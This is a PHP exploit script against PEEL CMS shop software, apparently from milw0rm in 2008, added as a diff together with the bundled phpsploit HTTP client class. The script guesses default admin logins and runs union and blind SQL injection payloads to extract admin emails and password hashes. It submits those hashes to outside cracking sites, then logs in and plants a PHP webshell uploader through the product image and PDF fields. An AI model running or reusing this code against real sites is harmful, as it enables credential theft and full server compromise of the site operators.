@@ -1,0 +1,953 @@
+#!/usr/bin/php
+<?php
+
+/*---------------------------------------------------------------*\
+ *
+ * Exploit:	PEEL CMS Admin Hash Extraction and Remote Upload
+ * Credits:	Charles "real" F. <charlesfol[at]hotmail.fr>
+ * URL: 	http://realn.free.fr/
+ * Date:	03-18-08
+ *
+ * Targets:	PEEL PREMIUM	PEEL POWERSELL
+ *      	PEEL INTEGRALE	PEEL PROFESSIONNELLE
+ *
+ * This exploit will use multiple vulns of multiple versions
+ * of PEEL to try to spawn a Remote Upload File.
+ *
+ * Special thanks to: ddx39.
+ *
+\*---------------------------------------------------------------*/
+
+$md5loc = array(
+array('http://www.milw0rm.com/cracker/search.php','hash=','<TD align="middle" nowrap="nowrap" width=90>([^<]+)</TD><TD align="middle" nowrap="nowrap" width=90>cracked</TD></TR>'),
+array('http://gdataonline.com/qkhash.php?mode=txt&hash=','','</td><td width="35%"><b>([^<]+)</b></td></tr>'),
+array('http://pepowned.free.fr/?act=&x=52&y=16&md5=','','Le Plain Text de <b>\w{32}</b> est : <b>([^<]+)</b>'),
+array('http://passcracking.ru/index.php','admin=false&admin2=77.php&datafromuser=','<td>\w{32}</td><td bgcolor=\#FF0000>([^<]+)</td><td>'),
+array('http://md5.rednoize.com/?p&s=md5&_=&q=','','<div id="result">([^<]+)</div>'),
+array('http://ice.breaker.free.fr/md5.php?hash=','','<b><br><br> - ([^<]+)<br><br><br><a href=http://ice\.breaker\.free\.fr/'),
+);
+
+print "\n";
+print "   PEEL CMS Admin Hash Extraction and Remote Upload\n";
+print "       by Charles \"real\" F. <charlesfol[at]hotmail.fr>\n\n";
+
+if($argc<2)
+{
+	print "usage: php peel_exploit.php <url> [options]\n\n";
+	print "Options:\n";
+	print " -admin <login:pass>\tIf you have admin access, you can use this.\n";
+	print "\nexample: php peel_exploit.php http://site.org/boutique/ -admin admin:passw0rd\n";
+	exit();
+}
+
+$url = $argv[1];
+
+$xpl = new phpsploit();
+$xpl->agent("Mozilla Firefox");
+
+$admin = getparam("admin");
+if($admin)
+{
+	print "[*] Using admin login $admin\n";
+	list($login,$r) = explode(":",$admin);
+	attack($login,$r);
+	print "\n";
+}
+else
+{
+	/* --- ATTACK #1: LOGIN GUESSING --- */
+
+	print "[*] Attack #1\n";
+	$default = array( array("info@peel.fr","admin"), array("contact@peel.fr","cinema") );
+	for($i=0;$i<sizeof($default);$i++)
+	{
+		print "[*] Trying with ".$default[$i][0].":".$default[$i][1];
+		if(attack($default[$i][0],$default[$i][1])==1) exit();
+	}
+	print "[*] Attack failed.\n\n";
+
+	/* --- ATTACK #2: MAGIC_QUOTES_GPC --- */
+	
+	print "[*] Attack #2\n";
+	print "[*] magic_quotes_gpc=";
+	$c = $xpl->get($url."phpinfo.php");
+	if($c && preg_match('#<tr><td class="e">magic_quotes_gpc</td><td class="v">([^<]+)</td>#i',$c,$b))
+	{
+		print "$b[1]\n";
+	} else print "?\n";
+	if($b[1]!="On" && false)
+	{
+		attack("'%20OR%20(priv=%27admin%27%20AND%201=1)%20/*",'hell0');
+		if($b[1]=="Off") exit();
+	}
+	else print "[*] Attack failed.\n\n";
+	
+	/* --- ATTACK #3: SQL INJECTION --- */
+	
+	print "[*] Attack #3\n";
+	for($i=0;;$i++)
+	{
+		$c = $xpl->get($url."achat/historique_commandes.php?mode=details&id=-1&id_utilisateur=-1&timestamp=%2527%20UNION%20SELECT%20id_utilisateur,2,email,4,5,6,7,8,mot_passe,10,11,12,13,14,15%20FROM%20peel_utilisateurs%20WHERE%20priv=%2527admin%2527%20LIMIT%20$i,1/*");
+
+		preg_match("#(\w+@\w+\.\w+)</a></td>#i",$c,$login);
+		preg_match("#(\w{32})</td>#i",$c,$passwd);
+
+		if(count($login)<1)
+		{
+			if($i==0) print "[*] Attack failed.\n\n";
+			else      print "[*] Attack failed (if you crack a hash, use -admin param).\n\n";
+			break;
+		}
+		
+		$login	= $login[1];
+		$passwd	= $passwd[1];
+		
+		print "[*] Login:\t$login\n";
+		print "[*] Hash:\t$passwd\n";
+
+		$md5 = strtolower($passwd);
+		for($a=0;$a<sizeof($md5loc);$a++)
+		{
+			$r = crack($md5loc[$a][0],$md5loc[$a][1],$md5loc[$a][2]);
+			if($r) { print "[*] Password:\t$r\n";break; }
+		}
+		if(!$r) print "[*] Can't find the hash on the net, sorry.\n";
+		else
+		{ 
+			attack($login,$r);
+			die();
+		}
+	}
+	
+	/* --- ATTACK #4: BLIND SQL INJECTION --- */
+	
+	print "[*] Attack #4\n";
+	for($i=0;;$i++)
+	{
+		$sql = "%2527%20OR%20MID((SELECT%20email%20FROM%20peel_utilisateurs%20WHERE%20priv=%2527admin%2527%20LIMIT%200,1),$i,1)=123%20/*";
+		$xpl->get($url."factures/facture_html.php?mode=facture&id=1&timestamp=$sql/*");
+		if(!preg_match("#NO HACK#i",$xpl->getcontent()))
+		{
+			print "[*] Attack failed.\n\n";
+			break;
+		}
+		
+		print "[*] Login:\t";
+		$login	= blind("email",$i);
+		if($login=="")
+		{
+			if($i==0) print "\r[*] Attack failed.\n\n";
+			else      print "\r[*] Attack failed (if you crack a hash, use -admin param).\n\n";
+			break;
+		}
+		print "\n[*] Hash:\t";
+		$passwd	= blind("mot_passe",$i);
+		print "\n";
+		$md5 = strtolower($passwd);
+		for($a=0;$a<sizeof($md5loc);$a++)
+		{
+			$r = crack($md5loc[$a][0],$md5loc[$a][1],$md5loc[$a][2]);
+			if($r) { print "[*] Password:\t$r\n";break; }
+		}
+		if(!$r) print "[*] Can't find the hash on the net, sorry.\n";
+		else
+		{ 
+			attack($login,$r);
+			die();
+		}
+	}
+}
+
+function blind($field,$i=0)
+{
+	global $xpl,$url;
+	$d=0; $v='';
+	
+	$charset = "etaonisrhldcumfpwgbyvkxjqz0123456789_-\$.^()[]{}Š*\"'@=/\|#?+&!`<>:;,\\";
+	if(eregi('p',$field)) $charset = "0123456789abcdef";
+
+	while(TRUE)
+	{
+		$d++;
+		for($e=0;$e<strlen($charset);$e++)
+		{
+			$f=ord(substr($charset,$e,1));
+			$sql = "%2527%20OR%20MID((SELECT%20$field%20FROM%20peel_utilisateurs%20WHERE%20priv=%2527admin%2527%20LIMIT%20$i,1),$d,1)=CHAR($f)%20/*";
+			$xpl->get($url."factures/facture_html.php?mode=facture&id=1&timestamp=$sql/*");
+			if(!preg_match("#NO HACK#",$xpl->getcontent(),$matches))
+			{
+				print strtolower(chr($f));
+				$v .= chr($f);
+				break;
+			}
+			elseif($e==strlen($charset)-1) return $v;
+		}
+	}
+}
+
+function attack($login,$r)
+{
+	global $xpl,$url;
+	print "\n[*] Login in ... ";
+	$xpl->reset("cookies");
+	$c=$xpl->post($url."/membre.php","email=$login&mot_passe=$r");
+	if(!preg_match("#Location:.*".$url."index.php#i",$c) || !preg_match("#PHPSESSID=(\w{32})#i",$c,$sid))
+	{ print "failed.\n";return 0; }
+	$sid = $sid[1];
+	print "done.\n";
+	print "[*] SID:\t$sid\n";
+	$xpl->addcookie("PHPSESSID",$sid);
+
+	print "\n[*] Adding a fake product ... ";
+
+	$uploadc0de='<?php if(isset($_POST[\'upload\'])) { if( !move_uploaded_file($_FILES[\'file\'][\'tmp_name\'], "./".$_FILES[\'file\'][\'name\'])) echo("<center>Error ".$_FILES[\'file\'][\'error\']."</center>");else echo "<center>File uploaded</center>"; } ?><?php if(isset($_GET[\'del\'])) unlink("up.php"); ?><form method="post" enctype="multipart/form-data"><center><input type="file" name="file"><input type="submit" name="upload" value="Upload"></center></form>';
+	$frmdt	=	array(frmdt_url	  => $url."administrer/produits.php?mode=ajout",
+					"mode"		  => "insere",
+					"id"		  => "",
+					"categories[]"=> "-1",
+					"reference"	  => "",
+					"nom"		  => "hell0",
+					"nom_fr"	  => "hell0",
+					"nom_en"	  => "hell0",
+					"prix"		  => "",
+					"tva"		  => "19.60",
+					"promotion"   => "",
+					"references[]"=> "",
+					"descriptif"  => "",
+					"pformat"	  => "html",
+					"description" => "",
+					"mp3"		  => "",
+					"extrait"	  => "",
+					"image1"	  => array(frmdt_filename	=> "",
+								     frmdt_type		=> "application/octet-stream",
+								     frmdt_content	=> ""),
+					"image2"	  => array(frmdt_filename	=> "",
+										   frmdt_type		=> "application/octet-stream",
+										   frmdt_content	=> ""),
+					"image3"	  => array(frmdt_filename	=> "file.php",
+										   frmdt_type		=> "image/gif",
+										   frmdt_content	=> "$uploadc0de"),
+					"image4"	  => array(frmdt_filename	=> "",
+										   frmdt_type		=> "application/octet-stream",
+										   frmdt_content	=> ""),
+					"pdf"		  => array(frmdt_filename	=> "file.php",
+										   frmdt_type		=> "application/pdf",
+										   frmdt_content	=> "$uploadc0de"),
+					);
+
+	$c = $xpl->formdata($frmdt);
+
+	if(!preg_match("#([0-9]+)(&page=[0-9]+)?\"[^<]*>(<[^<]+>)?hell0(<[^<]+>)?</a>#i",$c,$id))
+	{ print "failed.\n";return 0; }
+
+	$id = $id[1];
+	print "done.\n";
+	print "[*] Article ID:\t$id\n";
+	
+	print "[*] Uploading uploader ... ";
+	$c = $xpl->get($url."administrer/produits.php?mode=modif&id=$id");
+	if(!preg_match("#((administrer/)?upload/)([a-z._-]+_[0-9]{6}_[0-9]{6}|[0-9]{6}_[0-9]{6}_PEEL_\w{6})\.php#i",$c,$file)) print "failed (can't find file).\n";
+	else
+	{
+		$frmdt =  array(frmdt_url=>$url.$file[0],"upload"=>1,"file"=> array(frmdt_filename=>"up.php",frmdt_type=>"text/plain",frmdt_content=>"$uploadc0de"));
+		if(preg_match("#Uploaded#i",$xpl->formdata($frmdt))) print "done.\n";
+		else print "failed (can't upload file).\n";
+	}
+	
+	print "[*] Deleting the fake product ... ";
+	$xpl->get($url."administrer/produits.php?mode=suppr&id=$id");
+	print "done.\n";
+	
+	if(sizeof($file)>0)
+	{
+		$path = $file[1];
+		print "\n[*] Uploader: ".$url.$path."up.php\n";
+	}
+	
+	return 1;
+}
+
+function crack($url,$post,$gex)
+{
+	global $xpl,$md5;
+	if($post!=''&&preg_match("#$gex#",$xpl->post("$url","$post$md5"),$res)) return $res[1];
+	elseif(preg_match("#$gex#",$xpl->get("$url$md5"),$res)) return $res[1];
+	return 0;
+}
+
+function getparam($param,$opt='')
+{
+	global $argv;
+	foreach($argv as $value => $key)
+	{
+		if($key == '-'.$param) return $argv[$value+1];
+	}
+	if($opt) exit("\n-$param parameter required");
+	else return;
+}
+
+/*
+ * 
+ * Copyright (C) darkfig
+ * 
+ * This program is free software; you can redistribute it and/or 
+ * modify it under the terms of the GNU General Public License 
+ * as published by the Free Software Foundation; either version 2 
+ * of the License, or (at your option) any later version. 
+ * 
+ * This program is distributed in the hope that it will be useful, 
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of 
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
+ * GNU General Public License for more details. 
+ * 
+ * You should have received a copy of the GNU General Public License 
+ * along with this program; if not, write to the Free Software 
+ * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
+ * 
+ * TITLE:          PhpSploit Class
+ * REQUIREMENTS:   PHP 4 / PHP 5
+ * VERSION:        2.0
+ * LICENSE:        GNU General Public License
+ * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt
+ * FILENAME:       phpsploitclass.php
+ *
+ * CONTACT:        gmdarkfig@gmail.com (french / english)
+ * GREETZ:         Sparah, Ddx39
+ *
+ * DESCRIPTION:
+ * The phpsploit is a class implementing a web user agent.
+ * You can add cookies, headers, use a proxy server with (or without) a
+ * basic authentification. It supports the GET and the POST method. It can
+ * also be used like a browser with the cookiejar() function (which allow
+ * a server to add several cookies for the next requests) and the
+ * allowredirection() function (which allow the script to follow all
+ * redirections sent by the server). It can return the content (or the
+ * headers) of the request. Others useful functions can be used for debugging.
+ * A manual is actually in development but to know how to use it, you can
+ * read the comments.
+ *
+ * CHANGELOG:
+ *
+ * [2007-06-10] (2.0)
+ *  * Code: Code optimization
+ *  * New: Compatible with PHP 4 by default
+ *
+ * [2007-01-24] (1.2)
+ *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))
+ *  * New: multipart/form-data enctype is now supported 
+ *
+ * [2006-12-31] (1.1)
+ *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)
+ *  * New: You can now call the getheader() / getcontent() function without parameters
+ *
+ * [2006-12-30] (1.0)
+ *  * First version
+ * 
+ */
+
+class phpsploit
+{
+	var $proxyhost;
+	var $proxyport;
+	var $host;
+	var $path;
+	var $port;
+	var $method;
+	var $url;
+	var $packet;
+	var $proxyuser;
+	var $proxypass;
+	var $header;
+	var $cookie;
+	var $data;
+	var $boundary;
+	var $allowredirection;
+	var $last_redirection;
+	var $cookiejar;
+	var $recv;
+	var $cookie_str;
+	var $header_str;
+	var $server_content;
+	var $server_header;
+	
+
+	/**
+	 * This function is called by the
+	 * get()/post()/formdata() functions.
+	 * You don't have to call it, this is
+	 * the main function.
+	 *
+	 * @access private
+	 * @return string $this->recv ServerResponse
+	 * 
+	 */
+	function sock()
+	{
+		if(!empty($this->proxyhost) && !empty($this->proxyport))
+		   $socket = @fsockopen($this->proxyhost,$this->proxyport);
+		else
+		   $socket = @fsockopen($this->host,$this->port);
+		
+		if(!$socket)
+		   die("Error: Host seems down");
+		
+		if($this->method=='get')
+		   $this->packet = 'GET '.$this->url." HTTP/1.1\r\n";
+		   
+		elseif($this->method=='post' or $this->method=='formdata')
+		   $this->packet = 'POST '.$this->url." HTTP/1.1\r\n";
+		   
+		else
+		   die("Error: Invalid method");
+		
+		if(!empty($this->proxyuser))
+		   $this->packet .= 'Proxy-Authorization: Basic '.base64_encode($this->proxyuser.':'.$this->proxypass)."\r\n";
+		
+		if(!empty($this->header))
+		   $this->packet .= $this->showheader();
+		   
+		if(!empty($this->cookie))
+		   $this->packet .= 'Cookie: '.$this->showcookie()."\r\n";
+	
+		$this->packet .= 'Host: '.$this->host."\r\n";
+		$this->packet .= "Connection: Close\r\n";
+		
+		if($this->method=='post')
+		{
+			$this->packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+			$this->packet .= 'Content-Length: '.strlen($this->data)."\r\n\r\n";
+			$this->packet .= $this->data."\r\n";
+		}
+		elseif($this->method=='formdata')
+		{
+			$this->packet .= 'Content-Type: multipart/form-data; boundary='.str_repeat('-',27).$this->boundary."\r\n";
+			$this->packet .= 'Content-Length: '.strlen($this->data)."\r\n\r\n";
+			$this->packet .= $this->data;
+		}
+
+		$this->packet .= "\r\n";
+		$this->recv = '';
+
+		fputs($socket,$this->packet);
+
+		while(!feof($socket))
+		   $this->recv .= fgets($socket);
+
+		fclose($socket);
+
+		if($this->cookiejar)
+		   $this->getcookie();
+
+		if($this->allowredirection)
+		   return $this->getredirection();
+		else
+		   return $this->recv;
+	}
+	
+
+	/**
+	 * This function allows you to add several
+	 * cookies in the request.
+	 * 
+	 * @access  public
+	 * @param   string cookn CookieName
+	 * @param   string cookv CookieValue
+	 * @example $this->addcookie('name','value')
+	 * 
+	 */
+	function addcookie($cookn,$cookv)
+	{
+		if(!isset($this->cookie))
+		   $this->cookie = array();
+
+		$this->cookie[$cookn] = $cookv;
+	}
+
+
+	/**
+	 * This function allows you to add several
+	 * headers in the request.
+	 *
+	 * @access  public
+	 * @param   string headern HeaderName
+	 * @param   string headervalue Headervalue
+	 * @example $this->addheader('Client-IP', '128.5.2.3')
+	 * 
+	 */
+	function addheader($headern,$headervalue)
+	{
+		if(!isset($this->header))
+		   $this->header = array();
+		   
+		$this->header[$headern] = $headervalue;
+	}
+
+
+	/**
+	 * This function allows you to use an
+	 * http proxy server. Several methods
+	 * are supported.
+	 * 
+	 * @access  public
+	 * @param   string proxy ProxyHost
+	 * @param   integer proxyp ProxyPort
+	 * @example $this->proxy('localhost',8118)
+	 * @example $this->proxy('localhost:8118')
+	 * 
+	 */
+	function proxy($proxy,$proxyp='')
+	{
+		if(empty($proxyp))
+		{
+			$proxarr = explode(':',$proxy);
+			$this->proxyhost = $proxarr[0];
+			$this->proxyport = (int)$proxarr[1];
+		}
+		else 
+		{
+			$this->proxyhost = $proxy;
+			$this->proxyport = (int)$proxyp;
+		}
+
+		if($this->proxyport > 65535)
+		   die("Error: Invalid port number");
+	}
+	
+
+	/**
+	 * This function allows you to use an
+	 * http proxy server which requires a
+	 * basic authentification. Several
+	 * methods are supported:
+	 *
+	 * @access  public
+	 * @param   string proxyauth ProxyUser
+	 * @param   string proxypass ProxyPass
+	 * @example $this->proxyauth('user','pwd')
+	 * @example $this->proxyauth('user:pwd');
+	 * 
+	 */
+	function proxyauth($proxyauth,$proxypass='')
+	{
+		if(empty($proxypass))
+		{
+			$posvirg = strpos($proxyauth,':');
+			$this->proxyuser = substr($proxyauth,0,$posvirg);
+			$this->proxypass = substr($proxyauth,$posvirg+1);
+		}
+		else
+		{
+			$this->proxyuser = $proxyauth;
+			$this->proxypass = $proxypass;
+		}
+	}
+
+
+	/**
+	 * This function allows you to set
+	 * the 'User-Agent' header.
+	 * 
+	 * @access  public
+	 * @param   string useragent Agent
+	 * @example $this->agent('Firefox')
+	 * 
+	 */
+	function agent($useragent)
+	{
+		$this->addheader('User-Agent',$useragent);
+	}
+
+	
+	/**
+	 * This function returns the headers
+	 * which will be in the next request.
+	 * 
+	 * @access  public
+	 * @return  string $this->header_str Headers
+	 * @example $this->showheader()
+	 * 
+	 */
+	function showheader()
+	{
+		$this->header_str = '';
+		
+		if(!isset($this->header))
+		   return;
+		   
+		foreach($this->header as $name => $value)
+		   $this->header_str .= $name.': '.$value."\r\n";
+		   
+		return $this->header_str;
+	}
+
+	
+	/**
+	 * This function returns the cookies
+	 * which will be in the next request.
+	 * 
+	 * @access  public
+	 * @return  string $this->cookie_str Cookies
+	 * @example $this->showcookie()
+	 * 
+	 */
+	function showcookie()
+	{
+		$this->cookie_str = '';
+		
+		if(!isset($this->cookie))
+		   return;
+		
+		foreach($this->cookie as $name => $value)
+		   $this->cookie_str .= $name.'='.$value.'; ';
+
+		return $this->cookie_str;
+	}
+
+
+	/**
+	 * This function returns the last
+	 * formed http request.
+	 * 
+	 * @access  public
+	 * @return  string $this->packet HttpPacket
+	 * @example $this->showlastrequest()
+	 * 
+	 */
+	function showlastrequest()
+	{
+		if(!isset($this->packet))
+		   return;
+		else
+		   return $this->packet;
+	}
+
+
+	/**
+	 * This function sends the formed
+	 * http packet with the GET method.
+	 * 
+	 * @access  public
+	 * @param   string url Url
+	 * @return  string $this->sock()
+	 * @example $this->get('localhost/index.php?var=x')
+	 * @example $this->get('http://localhost:88/tst.php')
+	 * 
+	 */
+	function get($url)
+	{
+		$this->target($url);
+		$this->method = 'get';
+		return $this->sock();
+	}
+
+	
+	/**
+	 * This function sends the formed
+	 * http packet with the POST method.
+	 *
+	 * @access  public
+	 * @param   string url  Url
+	 * @param   string data PostData
+	 * @return  string $this->sock()
+	 * @example $this->post('http://localhost/','helo=x')
+	 * 
+	 */	
+	function post($url,$data)
+	{
+		$this->target($url);
+		$this->method = 'post';
+		$this->data = $data;
+		return $this->sock();
+	}
+	
+
+	/**
+	 * This function sends the formed http
+	 * packet with the POST method using
+	 * the multipart/form-data enctype.
+	 * 
+	 * @access  public
+	 * @param   array array FormDataArray
+	 * @return  string $this->sock()
+	 * @example $formdata = array(
+	 *                      frmdt_url => 'http://localhost/upload.php',
+	 *                      frmdt_boundary => '123456', # Optional
+	 *                      'var' => 'example',
+	 *                      'file' => array(
+	 *                                frmdt_type => 'image/gif',  # Optional
+	 *                                frmdt_transfert => 'binary' # Optional
+	 *                                frmdt_filename => 'hello.php,
+	 *                                frmdt_content => '<?php echo 1; ?>'));
+	 *          $this->formdata($formdata);
+	 * 
+	 */
+	function formdata($array)
+	{
+		$this->target($array[frmdt_url]);
+		$this->method = 'formdata';
+		$this->data = '';
+		
+		if(!isset($array[frmdt_boundary]))
+		   $this->boundary = 'phpsploit';
+		else
+		   $this->boundary = $array[frmdt_boundary];
+
+		foreach($array as $key => $value)
+		{
+			if(!preg_match('#^frmdt_(boundary|url)#',$key))
+			{
+				$this->data .= str_repeat('-',29).$this->boundary."\r\n";
+				$this->data .= 'Content-Disposition: form-data; name="'.$key.'";';
+				
+				if(!is_array($value))
+				{
+					$this->data .= "\r\n\r\n".$value."\r\n";
+				}
+				else
+				{
+					$this->data .= ' filename="'.$array[$key][frmdt_filename]."\";\r\n";
+
+					if(isset($array[$key][frmdt_type]))
+					   $this->data .= 'Content-Type: '.$array[$key][frmdt_type]."\r\n";
+
+					if(isset($array[$key][frmdt_transfert]))
+					   $this->data .= 'Content-Transfer-Encoding: '.$array[$key][frmdt_transfert]."\r\n";
+
+					$this->data .= "\r\n".$array[$key][frmdt_content]."\r\n";
+				}
+			}
+		}
+
+		$this->data .= str_repeat('-',29).$this->boundary."--\r\n";
+		return $this->sock();
+	}
+
+	
+	/**
+	 * This function returns the content
+	 * of the server response, without
+	 * the headers.
+	 * 
+	 * @access  public
+	 * @param   string code ServerResponse
+	 * @return  string $this->server_content
+	 * @example $this->getcontent()
+	 * @example $this->getcontent($this->get('http://localhost/'))
+	 * 
+	 */
+	function getcontent($code='')
+	{
+		if(empty($code))
+		   $code = $this->recv;
+
+		$code = explode("\r\n\r\n",$code);
+		$this->server_content = '';
+		
+		for($i=1;$i<count($code);$i++)
+		   $this->server_content .= $code[$i];
+
+		return $this->server_content;
+	}
+
+	
+	/**
+	 * This function returns the headers
+	 * of the server response, without
+	 * the content.
+	 * 
+	 * @access  public
+	 * @param   string code ServerResponse
+	 * @return  string $this->server_header
+	 * @example $this->getcontent()
+	 * @example $this->getcontent($this->post('http://localhost/','1=2'))
+	 * 
+	 */
+	function getheader($code='')
+	{
+		if(empty($code))
+		   $code = $this->recv;
+
+		$code = explode("\r\n\r\n",$code);
+		$this->server_header = $code[0];
+		
+		return $this->server_header;
+	}
+
+	
+	/**
+	 * This function is called by the
+	 * cookiejar() function. It adds the
+	 * value of the "Set-Cookie" header
+	 * in the "Cookie" header for the
+	 * next request. You don't have to
+	 * call it.
+	 * 
+	 * @access private
+	 * @param  string code ServerResponse
+	 * 
+	 */
+	function getcookie()
+	{
+		foreach(explode("\r\n",$this->getheader()) as $header)
+		{
+			if(preg_match('/set-cookie/i',$header))
+			{
+				$fequal = strpos($header,'=');
+				$fvirgu = strpos($header,';');
+				
+				// 12=strlen('set-cookie: ')
+				$cname  = substr($header,12,$fequal-12);
+				$cvalu  = substr($header,$fequal+1,$fvirgu-(strlen($cname)+12+1));
+				
+				$this->cookie[trim($cname)] = trim($cvalu);
+			}
+		}
+	}
+
+
+	/**
+	 * This function is called by the
+	 * get()/post() functions. You
+	 * don't have to call it.
+	 *
+	 * @access  private
+	 * @param   string urltarg Url
+	 * @example $this->target('http://localhost/')
+	 * 
+	 */
+	function target($urltarg)
+	{
+		if(!ereg('^http://',$urltarg))
+		   $urltarg = 'http://'.$urltarg;
+		   
+		$urlarr     = parse_url($urltarg);
+		$this->url  = 'http://'.$urlarr['host'].$urlarr['path'];
+		
+		if(isset($urlarr['query']))
+		   $this->url .= '?'.$urlarr['query'];
+		
+		$this->port = !empty($urlarr['port']) ? $urlarr['port'] : 80;
+		$this->host = $urlarr['host'];
+		
+		if($this->port != '80')
+		   $this->host .= ':'.$this->port;
+
+		if(!isset($urlarr['path']) or empty($urlarr['path']))
+		   die("Error: No path precised");
+
+		$this->path = substr($urlarr['path'],0,strrpos($urlarr['path'],'/')+1);
+
+		if($this->port > 65535)
+		   die("Error: Invalid port number");
+	}
+	
+	
+	/**
+	 * If you call this function,
+	 * the script will extract all
+	 * 'Set-Cookie' headers values
+	 * and it will automatically add
+	 * them into the 'Cookie' header
+	 * for all next requests.
+	 *
+	 * @access  public
+	 * @param   integer code 1(enabled) 0(disabled)
+	 * @example $this->cookiejar(0)
+	 * @example $this->cookiejar(1)
+	 * 
+	 */
+	function cookiejar($code)
+	{
+		if($code=='0')
+		   $this->cookiejar=FALSE;
+
+		elseif($code=='1')
+		   $this->cookiejar=TRUE;
+	}
+
+
+	/**
+	 * If you call this function,
+	 * the script will follow all
+	 * redirections sent by the server.
+	 * 
+	 * @access  public
+	 * @param   integer code 1(enabled) 0(disabled)
+	 * @example $this->allowredirection(0)
+	 * @example $this->allowredirection(1)
+	 * 
+	 */
+	function allowredirection($code)
+	{
+		if($code=='0')
+		   $this->allowredirection=FALSE;
+		   
+		elseif($code=='1')
+		   $this->allowredirection=TRUE;
+	}
+
+	
+	/**
+	 * This function is called if
+	 * allowredirection() is enabled.
+	 * You don't have to call it.
+	 *
+	 * @access private
+	 * @return string $this->get('http://'.$this->host.$this->path.$this->last_redirection)
+	 * @return string $this->get($this->last_redirection)
+	 * @return string $this->recv;
+	 * 
+	 */
+	function getredirection()
+	{
+		if(preg_match('/(location|content-location|uri): (.*)/i',$this->getheader(),$codearr))
+		{
+			$this->last_redirection = trim($codearr[2]);
+			
+			if(!ereg('://',$this->last_redirection))
+			   return $this->get('http://'.$this->host.$this->path.$this->last_redirection);
+
+			else
+			   return $this->get($this->last_redirection);
+		}
+		else
+		   return $this->recv;
+	}
+
+
+	/**
+	 * This function allows you
+	 * to reset some parameters.
+	 * 
+	 * @access  public
+	 * @param   string func Param
+	 * @example $this->reset('header')
+	 * @example $this->reset('cookie')
+	 * @example $this->reset()
+	 * 
+	 */
+	function reset($func='')
+	{
+		switch($func)
+		{
+			case 'header':
+			$this->header = array('');
+			break;
+				
+			case 'cookie':
+			$this->cookie = array('');
+			break;
+				
+			default:
+			$this->cookiejar = '';
+			$this->header = array('');
+			$this->cookie = array('');
+			$this->allowredirection = '';
+			break;
+		}
+	}
+}
+
+?>
+
+# milw0rm.com [2008-03-19]
